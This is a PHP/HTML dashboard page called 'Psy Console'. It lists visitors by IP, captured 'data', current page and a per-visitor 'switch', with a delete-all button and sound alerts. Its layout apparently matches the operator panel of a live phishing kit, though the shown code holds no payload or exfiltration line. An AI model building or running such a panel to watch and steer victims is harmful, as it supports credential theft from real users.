<?php

?>


<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="files/bootstrap.min.css"  crossorigin="anonymous" />
    <link rel="stylesheet" href="files/bootstrap-table.min.css" />
    <title>Psy Console</title>

</head>
<body style=" background-color: #e9ecef; ">

    <!-- Page Content -->
    <div class="container" style="max-width: 100%">

        <!-- Jumbotron Header -->
        <header class="">
		<img style="-webkit-user-select: none;" src="js/logo.png">
            
            <p class="lead">...</p>
            <a href="#" class="btn btn-primary btn-lg" onclick="Backend.Post('api.php',{action:'delete_all'})">Delete All!</a>
            <a href="#" id="sound_btn" class="btn btn-primary btn-lg" onclick="SwitchSound()">Enable Sound</a>
        </header>

        <!-- data table -->
        <div class="row" style="margin-bottom: 20px">
            <div class="col-md-12">
                <table id="table" data-toggle="table" class="table table-sm">
                    <thead>
                        <tr>
                            <th scope="col">id</th>
                            <th scope="col">ip</th>
                            <th scope="col">data</th>
                            <th scope="col">last seen</th>
                            <th scope="col">page</th>
                            <th scope="col">switch</th>
                            <th scope="col">actions</th>
                        </tr>
                    </thead>
                    <tbody></tbody>
                </table>
            </div>
        </div>


        <!-- Page Features -->
        <div class="row text-center">

            <div class="col-lg-3 col-md-6 mb-4" style=" display: none; ">
                <div class="card h-100">
                    <img class="card-img-top" src="http://placehold.it/500x325" alt="" />
                    <div class="card-body">
                        <h4 class="card-title">Card title</h4>
                        <p class="card-text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Sapiente esse necessitatibus neque.</p>
                    </div>
                    <div class="card-footer">
                        <a href="#" class="btn btn-primary">Find Out More!</a>
                    </div>
                </div>
            </div>

            <div class="col-lg-3 col-md-6 mb-4" style=" display: none; ">
                <div class="card h-100">
                    <img class="card-img-top" src="http://placehold.it/500x325" alt="" />
                    <div class="card-body">
                        <h4 class="card-title">Card title</h4>
                        <p class="card-text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Explicabo magni sapiente, tempore debitis beatae culpa natus architecto.</p>
                    </div>
                    <div class="card-footer">
                        <a href="#" class="btn btn-primary">Find Out More!</a>
                    </div>
                </div>
            </div>

            <div class="col-lg-3 col-md-6 mb-4" style=" display: none; ">
                <div class="card h-100">
                    <img class="card-img-top" src="http://placehold.it/500x325" alt="" />
                    <div class="card-body">
                        <h4 class="card-title">Card title</h4>
                        <p class="card-text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Sapiente esse necessitatibus neque.</p>
                    </div>
                    <div class="card-footer">
                        <a href="#" class="btn btn-primary">Find Out More!</a>
                    </div>
                </div>
            </div>

            <div class="col-lg-3 col-md-6 mb-4" style=" display: none; ">
                <div class="card h-100">
                    <img class="card-img-top" src="http://placehold.it/500x325" alt="" />
                    <div class="card-body">
                        <h4 class="card-title">Card title</h4>
                        <p class="card-text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Explicabo magni sapiente, tempore debitis beatae culpa natus architecto.</p>
                    </div>
                    <div class="card-footer">
                        <a href="#" class="btn btn-primary">Find Out More!</a>
                    </div>
                </div>
            </div>

        </div>
        <!-- /.row -->

    </div>
    <!-- /.container -->

    <!-- Footer -->
    <footer class="py-5 bg-dark">
        <div class="container">
            <p class="m-0 text-center text-white">Copyright &copy; Psy 2019</p>
        </div>
        <!-- /.container -->
    </footer>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="files/popper.min.js"  crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" crossorigin="anonymous"></script>
    <script src="js/jquery.playSound.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-table/1.16.0/bootstrap-table.min.js"></script>
    <script src="js/moment.js"></script>
    <script src="files/table.minified.js"></script>
</body>
</html>